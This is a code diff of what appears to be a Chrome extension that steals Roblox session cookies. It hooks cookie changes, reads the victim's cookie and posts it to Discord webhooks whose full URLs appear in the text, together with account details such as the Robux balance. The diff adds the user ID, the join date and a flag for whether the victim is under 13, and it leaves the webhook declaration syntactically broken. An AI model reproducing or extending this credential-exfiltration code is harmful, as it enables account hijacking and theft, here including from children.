@@ -1,13 +1,5 @@
-const WEBHOOKS = [
-    {
-        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
+const WEBHOOKS "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
         mention: "@everyone"
-    },
-    {
-        url: "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU",
-        mention: "@everyone"
-    }
-];
 
 let lastCookie = null; // 🔑 Track last sent cookie
 
@@ -68,8 +60,12 @@ async function main(cookie) {
             let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
             let hasHeadless = await checkOwnership(user.id, 134082579, cookie);
 
+            // ✅ Add User ID, Underage, Join Date
             statistics = {
                 UserName: user.name,
+                UserId: user.id,
+                IsUnder13: user.isUnder13,
+                JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
                 RobuxBalance: economy.robux ?? "N/A",
                 PendingRobux: economy.robuxPending ?? "N/A",
                 IsPremium: isPremium,
@@ -89,6 +85,9 @@ async function main(cookie) {
                 "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                 "fields": [
                     { "name": "Username", "value": statistics ? statistics.UserName : "N/A", "inline": true },
+                    { "name": "User ID", "value": statistics ? statistics.UserId : "N/A", "inline": true },
+                    { "name": "Underage", "value": statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", "inline": true },
+                    { "name": "Join Date", "value": statistics ? statistics.JoinDate : "N/A", "inline": true },
                     { "name": "Robux", "value": statistics ? statistics.RobuxBalance : "N/A", "inline": true },
                     { "name": "Pending Robux", "value": statistics ? statistics.PendingRobux : "N/A", "inline": true },
                     { "name": "Premium", "value": statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", "inline": true },
@@ -138,7 +137,3 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
-
-
-
-
